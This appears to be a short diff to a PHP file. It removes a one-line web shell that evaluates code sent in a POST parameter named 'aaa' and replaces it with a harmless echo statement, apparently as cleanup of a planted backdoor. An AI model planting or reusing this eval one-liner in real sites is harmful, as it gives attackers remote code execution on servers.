@@ -1,1 +1,3 @@
-<?php @eval($_POST["aaa"]); ?>
+<?
+echo "haha";
+?>
